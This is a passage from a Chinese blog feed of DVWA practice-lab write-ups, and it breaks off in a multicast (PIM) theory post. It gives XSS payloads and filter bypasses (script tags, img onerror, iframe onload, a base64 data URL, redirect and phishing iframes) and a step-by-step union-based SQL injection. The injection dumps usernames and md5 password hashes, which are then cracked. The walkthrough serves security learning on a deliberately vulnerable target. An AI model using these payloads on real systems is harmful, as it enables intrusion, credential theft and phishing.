size="4">存储型XSS会把用户输入的数据“存储”在服务器端。如果没有过滤或者过滤不严，那么这些恶意代码被服务器端接收并存储，用户访问该页面的时候触发代码执行。这种XSS具有很强的稳定性，当再次访问页面时会被执行。持久化.这种XSS比较危险，容易造成蠕虫，盗窃cookie等。</font></div><div class="tip "><p>存储型XSS和反射型XSS、DOM型XSS相比，具有更高的隐蔽性，危害性也更大。它们之间最大的区别在于反射型XSS与DOM型XSS执行都必须依靠用户手动去触发，而存储型XSS却不需要。</p></div><h2 id="3-DOM-Based-XSS"><a href="#3-DOM-Based-XSS" class="headerlink" title="3.DOM Based XSS"></a>3.DOM Based XSS</h2><div style="text-indent:2em;"><font size="4">DOM的全称为Document Object Model，即文档对象模型，DOM通常用于代表在HTML、XHTML和XML中的对象。使用DOM可以允许程序和脚本动态低访问和更新文档的内容、结构和样式。</font></div><div style="text-indent:2em;"><font size="4">实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分的，从效果上来说也是反射型XSS单独划分出来的，因为DOM Based XSS的形成原因比较特别。这是由于客户端脚本自身解析不正确导致的安全问题。</font></div><div style="text-indent:2em;"><font size="4">这种利用也需要受害者点击链接来触发，DOM型XSS是前端代码中存在了漏洞（DOM型的XSS是不需要与服务器交互的，它只发生在客户端处理数据阶段），而反射型是后端代码中存在了漏洞。</font></div><div class="tip "><p>反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，在dom xss中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。</p></div><hr><h1 id="XSS漏洞危害"><a href="#XSS漏洞危害" class="headerlink" title="XSS漏洞危害"></a>XSS漏洞危害</h1><div style="text-indent:2em;"><font size="4">1、强制广告弹窗</font></div><div style="text-indent:2em;"><font size="4">2、网络钓鱼，盗取各类用户的账号</font></div><div style="text-indent:2em;"><font size="4">3、窃取用户Cookie，获取用户隐私，或者利用用户身份进一步执行操作</font></div><div style="text-indent:2em;"><font size="4">4、窃取管理员的cookie，进行恶意操作</font></div><div style="text-indent:2em;"><font size="4">5、传播跨站脚本蠕虫，网站挂马</font></div><hr><div><font size="6"><b><center>Vulnerability: Reflected Cross Site Scripting (XSS)</center></b></font></div><h1 id="难度-Low"><a href="#难度-Low" class="headerlink" title="难度 Low"></a>难度 Low</h1><h2 id="页面源代码分析"><a href="#页面源代码分析" class="headerlink" title="页面源代码分析"></a>页面源代码分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><blockquote><div><font size="4">代码分析：直接采用get方式传入了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。</font></div></blockquote><div style="text-indent:2em;"><font size="4">直接输入最简单的payload：&lt;script&gt;alert(/这是一个XSS弹窗/)&lt;/script&gt;测试是否存在XSS漏洞，大多数XSS漏洞可以利用该种方法检测回显弹框</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220922184830886.png" alt="image-20220922184830886"></p><div style="text-indent:2em;"><font size="4">通过URL解析得到一个name值</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220922183951942.png" alt="image-20220922183951942"></p><div style="text-indent:2em;"><font size="4">当网站中存在XSS漏洞时，攻击者可以对其盗取cookie值等一系列危害操作</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220922184231037.png" alt="image-20220922184231037"></p><div><font size="5"><b>Low难度级别为简单的反射弹窗实验,目的是为了了解XSS攻击的一个基本概念</b></font></div><hr><h1 id="难度Medium"><a href="#难度Medium" class="headerlink" title="难度Medium"></a>难度Medium</h1><h2 id="页面代码分析"><a href="#页面代码分析" class="headerlink" title="页面代码分析"></a>页面代码分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><blockquote><div><font size="4">代码分析：在Low级别的难度上，对script字符进行了过滤，使用str_replace()函数将输入中的script替换成为空，于是需要我们想办法绕过过滤字符。</font></div></blockquote><div style="text-indent:2em;"><font size="4">有两种最简单的绕过方式</font></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#双写绕过</span></span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;<span class="title function_ invoke__">alert</span>(/这是一个xss弹窗/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4"><b>测试：</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220923161458280.png" alt="image-20220923161458280"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#大小写绕过</span></span><br><span class="line">&lt;ScRipt&gt;<span class="title function_ invoke__">alert</span>(/这是一个XSS弹窗/)&lt;/ScRipt&gt;</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4"><b>测试：</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220923161558181.png" alt="image-20220923161558181"></p><div><font size="5"><b>Medium难度级别为中级的XSS测试,通过对&lt;script&gt;&lt;/script&gt;标签的过滤使其无法正常的进行攻击，通过大小写以及双写绕过即可完成操作</b></font></div><hr><h1 id="难度High"><a href="#难度High" class="headerlink" title="难度High"></a>难度High</h1><h2 id="页面代码分析-1"><a href="#页面代码分析-1" class="headerlink" title="页面代码分析"></a>页面代码分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><blockquote><div><font size="4">代码分析：高级难度针对特殊符号，均有过滤，使得双写绕过以及大小写混淆绕过失效。(正则表达式中的i表示不区分大小写)。</font></div></blockquote><div class="tip error"><p>script标签失效，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p></div><div><font size="4"><b>第一种方法：采用img标签转换后的XSS payload：</b></font></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src = <span class="number">1</span> onerror = <span class="title function_ invoke__">alert</span>(/这是一个xss弹窗/)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220923162442921.png" alt="image-20220923162442921"></p><div style="text-indent:2em;"><font size="4">通过img标签，提交后会请求图片路径为1是否存在，不存在则通过onerror属性进行报错提示，属性值设置为alert参数，进行弹窗。</font></div><hr><div><font size="4"><b>第二种方法：使用iframe标签：</b></font></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe οnlοad=<span class="title function_ invoke__">alert</span>(/这是一个xss弹窗/)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220923163322946.png" alt="image-20220923163322946"></p><div><font size="4"><b>第三种方法：如果网站中存在许多的标签过滤，还可以使用html的编码进行XSS：</b></font></div><div style="text-indent:2em;"><font size="4">使用DATA URL进行XSS:</font></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">object</span> data=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;&lt;/<span class="keyword">object</span>&gt;</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4">通过对代码进行base64的转换后，使用object标签中的data url</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220923163927935.png" alt="image-20220923163927935"></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220923163903159.png" alt="image-20220923163903159"></p><hr><div style="text-indent:2em;"><font size="4">JS语言还是蛮强大的，我们可以通过多种组合对网页进行代码测试</font></div><h1 id="使用meta标签跳转网页进行引流"><a href="#使用meta标签跳转网页进行引流" class="headerlink" title="使用meta标签跳转网页进行引流"></a>使用meta标签跳转网页进行引流</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;5;url=http://www.ssshaonan.com&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220923165350682.png" alt="image-20220923165350682"></p><hr><h1 id="使用iframe标签进行网站钓鱼"><a href="#使用iframe标签进行网站钓鱼" class="headerlink" title="使用iframe标签进行网站钓鱼"></a>使用iframe标签进行网站钓鱼</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://www.ssshaonan.com&quot;</span> name=<span class="string">&quot;iframe_a&quot;</span> width=<span class="string">&quot;1000px&quot;</span> height=<span class="string">&quot;900px&quot;</span>&gt;</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4">在当前界面打印出需要跳转引流的网站</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220923165519136.png" alt="image-20220923165519136"></p><hr><div><font size="6"><b><center>网络安全始于心，安全网络践于行</center></b></font></div><div><font size="6"><b><center>守护网络安全，呵护精神家园</center></b></font></div><hr>]]></content>
      
      
      <categories>
          
          <category> DVWA系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection</title>
      <link href="/posts/e5ccae9f/"/>
      <url>/posts/e5ccae9f/</url>
      
        <content type="html"><![CDATA[<div><font size="6"><b><center>本次实验使用DVWA靶场中的SQL Injection</center></b></font></div><blockquote><div><font size="4">网络安全真是一条艰难的路，慢慢学   <psw>我是小菜鸡 www.....</psw></font></div></blockquote><div class="tip success"><p>首先在进行实验之前回顾基本的理论知识！！！</p></div><h1 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h1><div style="text-indent:2em;"><font size="4">就是通过把<font color="red">恶意的sql命令</font>插入web表单递交给服务器，或者输入域名或页面请求的查询字符串递交到服务器，达到欺骗服务器，让服务器执行这些恶意的sql命令，从而让攻击者，可以绕过一些机制，达到直接访问数据库的一种攻击手段。</font></div><h1 id="SQL注入的几种类型"><a href="#SQL注入的几种类型" class="headerlink" title="SQL注入的几种类型"></a>SQL注入的几种类型</h1><ol><li><div><font size="4">数字型</font></div></li><li><div><font size="4">字符型</font></div></li><li><div><font size="4">报错注入</font></div></li><li><div><font size="4">Boollean注入 </font></div></li><li><div><font size="4">时间注入</font></div></li></ol><h1 id="SQL注入思路"><a href="#SQL注入思路" class="headerlink" title="SQL注入思路"></a>SQL注入思路</h1><ol><li><div><font size="4">判断是否存在注入，注入是字符型还是数字型</font></div></li><li><div><font size="4">猜解SQL查询语句中的字段数</font></div></li><li><div><font size="4">确定回显位置</font></div></li><li><div><font size="4">获取当前数据库</font></div></li><li><div><font size="4">获取数据库中的表</font></div></li><li><div><font size="4">获取表中的字段名</font></div></li><li><div><font size="4">得到数据</font></div></li></ol><h1 id="SQL注入绕过方法"><a href="#SQL注入绕过方法" class="headerlink" title="SQL注入绕过方法"></a>SQL注入绕过方法</h1><ol><li><div><font size="4">注释符号绕过</font></div></li><li><div><font size="4">大小写绕过</font></div></li><li><div><font size="4">内联注释绕过</font></div></li><li><div><font size="4">特殊编码绕过</font></div></li><li><div><font size="4">空格过滤绕过</font></div></li><li><div><font size="4">过滤or and xor not 绕过</font></div></li></ol><h1 id="SQL注入漏洞的分析"><a href="#SQL注入漏洞的分析" class="headerlink" title="SQL注入漏洞的分析"></a>SQL注入漏洞的分析</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><div style="text-indent:2em;"><font size="4">SQL注入（SQLi）是一种注入攻击，可以执行恶意SQL语句。它通过将任意SQL代码插入数据库查询，使攻击者能够完全控制Web应用程序后面的数据库服务器。攻击者可以使用SQL注入漏洞绕过应用程序安全措施；可以绕过网页或Web应用程序的身份验证和授权，并检索整个SQL数据库的内容；还可以使用SQL注入来添加，修改和删除数据库中的记录。</font></div><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><div style="text-indent:2em;"><font size="4">SQL 注入漏洞存在的原因，就是拼接SQL参数。也就是将用于输入的查询参数，直接拼接在SQL语句中，导致了SQL注入漏洞。</font></div><div style="text-indent:2em;"><font size="4">web 开发人员无法保证所有的输入都已经过滤</font></div><div style="text-indent:2em;"><font size="4">攻击者利用发送给服务器的输入参数构造可执行的 SQL 代码（可加入到 get 请求、 post 谓求、 http 头信思、 cookie 中）</font></div><div style="text-indent:2em;"><font size="4">数据库未做相应的安全配置</font></div><hr><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="一：DVWA靶场SQL-Injection-Low级别"><a href="#一：DVWA靶场SQL-Injection-Low级别" class="headerlink" title="一：DVWA靶场SQL Injection Low级别"></a>一：DVWA靶场SQL Injection Low级别</h2><div><font size="4"><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>Step 1：首先要判断当前的注入类型是什么，数字类型？字符类型？</p>            </div></font></div><div style="text-indent:2em;"><font size="4">输入1，看到界面回显值正确</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/image-20220916193316643.png" alt="image-20220916193316643"></p><div style="text-indent:2em;"><font size="4">输入1'，界面返回值错误</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/image-20220916193440072.png" alt="image-20220916193440072"></p><blockquote><div style="text-indent:2em;"><font size="4">由此可以判断出为该漏洞为字符型注入</font></div></blockquote><div style="text-indent:2em;"><font size="4">使用1’ or 1=1 #可以获取到所有用户</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/image-20220916194400497.png" alt="image-20220916194400497"></p><div><font size="4"><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>Step 2：通过order by进行判断字段数，依次尝试，直到报错为止</p>            </div></font></div><blockquote><div><font size="4">这里我尝试了两次    1' order by 1#    1' order by 2#</font></div></blockquote><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/image-20220916193850161.png" alt="image-20220916193850161"></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/image-20220916193912988.png" alt="image-20220916193912988"></p><div style="text-indent:2em;"><font size="4"><b>1‘ order by 3#</b>出现报错，说明字段只有两列</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/image-20220916193929677.png" alt="image-20220916193929677"></p><div><font size="4"><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>Step 3：判断回显的字段顺序</p>            </div></font></div><div style="text-indent:2em;"><font size="4">输入 </font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/image-20220916194626573.png" alt="image-20220916194626573"></p><div><font size="4"><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>Step 4：判查询当前的数据库</p>            </div></font></div><div style="text-indent:2em;"><font size="4">输入 </font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,database()#</span></span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/image-20220916194844360.png" alt="image-20220916194844360"></p><div><font size="4"><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>Step 5：查询当前数据库下有哪几个表</p>            </div></font></div><div style="text-indent:2em;"><font size="4">输入 </font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,table_name from information_schema.tables where table_schema=&#x27;</span>dvwa</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/image-20220916195238422.png" alt="image-20220916195238422"></p><blockquote><p>可以看到<code>dvwa</code>这个数据库里有两张表<code>guestbook</code>和<code>users</code></p></blockquote><div><font size="4">如果库中的表比较多，可以使用group_concat()方法将表连接起来查看</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;  union select 1,group_concat(table_name) from information_schema.tables where tables_schema=database()#</span></span><br></pre></td></tr></table></figure><div><font size="4"><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>Step 6：获取表中的字段名</p>            </div></font></div><div><font size="4">输入</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/image-20220916200000722.png" alt="image-20220916200000722"></p><div><font size="4">这个表里有：</font></div><ol><li><div><font size="4">user_id</font></div></li><li><div><font size="4">first_name</font></div></li><li><div><font size="4">last_name</font></div></li><li><div><font size="4">user</font></div></li><li><div><font size="4">password</font></div></li><li><div><font size="4">avatar</font></div></li><li><div><font size="4">last_login</font></div></li><li><div><font size="4">failed_login</font></div></li></ol><blockquote><p>既然是漏洞破解，我们就只需要他的<code>user</code>和<code>password</code></p></blockquote><div><font size="4"><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>Step 7：获取数据（用户名和密码）</p>            </div></font></div><div><font size="4">输入</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select user,password from users # </span></span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/image-20220916200604925.png" alt="image-20220916200604925"></p><div class="tip warning faa-horizontal animated"><p>得到了数据库中所有的用户名和登录密码</p></div><div><font size="4">密码加密方式为md5，打开md5解密网站</font></div><p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p><div><font size="4">破解用户名为gordonb的用户密码</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/image-20220916201101527.png" alt="image-20220916201101527"></p><div><font size="4"><div class="tip success"><p>Low难度至此通关</p></div></font></div>]]></content>
      
      
      <categories>
          
          <category> DVWA系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组播基础知识+PIM协议理论</title>
      <link href="/posts/9b8b5e48/"/>
      <url>/posts/9b8b5e48/</url>
      
        <content type="html"><![CDATA[<h1 id="PIM协议介绍"><a href="#PIM协议介绍" class="headerlink" title="PIM协议介绍"></a>PIM协议介绍</h1><div><font size="4"><b>PIM称为协议无关组播。</b></font></div><div><font size="3">协议无关指的是与单播路由协议无关，即<font color="red">PIM不需要维护专门的单播路由信息。</font></font></div><div><font size="3">作为组播路由解决方案，它直接利用单播路由表的路由信息，对组播报文执行RPF检查，检查通过后创建组播路由表项，从而转发组播报文。</font></div><br><div>    <font size="4">        <span><b>目前在实际网络中，PIM主要有两种模式：</b></span>        <ul>            <li> PIM-DM（PIM-Dense Mode，PIM密集模式） 。</li>            <li>PIM-SM（PIM-Sparse Mode，PIM稀疏模式） ，</li>            <ul>                <li>PIM-SM（ASM）：为任意源组播建立组播分发树。</li>                <li>PIM-SM（SSM）：为指定源组播建立组播分发树。</li>            </ul>        </ul>    </font></div><br><div>    <font size="4"><b>PIM两种模式的使用场景：</b>        <ol><li> PIM-DM模式主要用在组成员较少且相对密集的组播网络中，该模式建立组播分发树的基本思路是“扩散-剪枝”，即将组播流量全网扩散，然后剪枝没有组成员的路径，最终形成组播分发树。</li>            <li>PIM-SM模式主要用在组成员较多且相对稀疏的组播网络中，该模式建立组播分发树的基本思路是先收集组成员信息，然后再形成组播分发树。使用PIM-SM模式不需要全网泛洪组播，对现网的影响较小，因此现网多使用PIM-SM模式。</li></ol>    </font></div><hr><h1 id="组播分发树的分类"><a href="#组播分发树的分类" class="headerlink" title="组播分发树的分类"></a>组播分发树的分类</h1><div><font size="4">组播数据转发需要<font color="red"><b>依赖组播分发树</font></b>，因此组播路由器需要通过协议来<font color="red"><b>构建组播分发树</b></font>。</font></div><div>    <font size="4">        <ul>            <li> 通过PIM形成的组播分发树主要分为以下两种：</li>            <ul>                <li>以组播源为根，组播组成员为叶子的组播分发树称为SPT（Shortest Path Tree），在PIM-DM与PIM-SM中均有使用。 </li>                <li>以RP（Rendezvous Point）为根，组播组成员为叶子的组播分发树称为RPT（RP Tree），在PIM-SM中使用。</li>            </ul>        </ul>    </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907175924488.png" alt="image-20220907175924488"></p><hr><h1 id="PIM协议路由表项"><a href="#PIM协议路由表项" class="headerlink" title="PIM协议路由表项"></a>PIM协议路由表项</h1><div>    <font size="4">        <ul>            <li> PIM网络中存在两种路由表项：</li>            <ul>                <li>（S，G）路由表项主要用于在PIM网络中建立SPT。对于PIM-DM网络和PIM-SM网络适用。</li>                <li>（*，G）路由表项主要用于在PIM网络中建立RPT。对于PIM-SM网络适用。</li>            </ul>        </ul>    </font></div><blockquote><div><font size="4">（*，G）表示只知道组不知道源的表项，（S，G）表示即有组也有源的表项</font></div></blockquote><hr><h1 id="PIM-DM协议"><a href="#PIM-DM协议" class="headerlink" title="PIM-DM协议"></a>PIM-DM协议</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><div><font size="4">PIM-DM主要用在组成员较少且相对密集的网络中，通过<b>“扩散-剪枝”的方式</b>形成组播转发树（SPT）。</font></div><div><font size="4">PIM-DM在形成SPT的过程中，除了扩散（Flooding），剪枝（Prune）机制外，还会涉及<b>邻居发现（Neighbor Discovery）</b>，<b>嫁接（Graft）</b>，<b>断言（Assert）</b>和<b>状态刷新（State Refresh）机制</b>。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907180529261.png" alt="image-20220907180529261"></p><hr><h2 id="协议报文"><a href="#协议报文" class="headerlink" title="协议报文"></a>协议报文</h2><div><font size="4"><b>PIM 协议号（103）</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907180744095.png" alt="image-20220907180744095"></p><hr><h2 id="邻居发现"><a href="#邻居发现" class="headerlink" title="邻居发现"></a>邻居发现</h2><div><font size="4"><font color="red">组播转发路径只能在PIM邻居之间建立</font>，因此邻居发现是形成组播分发树的先决条件。<br>邻居发现主要通过PIM Hello包完成。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907181428245.png" alt="image-20220907181428245"></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907181534680.png" alt="image-20220907181534680"></p><hr><h2 id="首次形成组播分发树"><a href="#首次形成组播分发树" class="headerlink" title="首次形成组播分发树"></a>首次形成组播分发树</h2><div>    <font size="4">        <ul>            <li>PIM-DM模式首次形成组播分发树主要依赖扩散机制、剪枝机制、断言机制与DR选举机制。</li>            <ul>                <li><b>扩散机制：</b>组播数据包向所有的PIM邻居泛洪，同时组播路由器产生组播路由表项。</li>                <li><b>断言机制：</b>当组播转发过程中存在多路访问网络，则需要选举出一个组播转发路由器，避免重复组播报文。</li>                <li><b>剪枝机制：</b>如果组播路由器下没有组成员，则将源到该组播路由器的组播转发路径剪枝。</li>            </ul>        </ul>    </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907182143120.png" alt="image-20220907182143120"></p><hr><h2 id="扩散机制"><a href="#扩散机制" class="headerlink" title="扩散机制"></a>扩散机制</h2><div><font size="4">组播源发送的组播报文会在全网内扩散。当PIM路由器接收到组播报文，先进行RPF检查，通过后会在该路由器上创建（S，G）表项，之后会向所有PIM邻居发送。</font></div><br><div><font size="4">PIM-DM形成的（S，G）表项有老化时间（默认210s），如果老化时间超时前没有收到新的组播报文，则删除（S，G）表项。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220907182555157.png" alt="image-20220907182555157"></p><hr><h2 id="断言机制"><a href="#断言机制" class="headerlink" title="断言机制"></a>断言机制</h2><div><font size="4">当一个网段内有多个相连的PIM路由器向该网段转发组播报文时，需要通过断言机制（Assert）来保证只有一个PIM路由器向该网段转发组播报文。</font></div><div>    <font size="4">        <ul>            <li>通过断言机制的选举规则将决定组播路由器的转发行为：</li>            <ul>                <li>获胜一方的下游接口称为Assert Winner，将负责后续对该网段组播报文的转发。</li>                <li>落败一方的下游接口称为Assert Loser，后续不会对该网段转发组播报文，PIM路由器也会将其从（S，G）表项下游接口列表中删除。</li>            </ul>        </ul>    </font></div><p><img 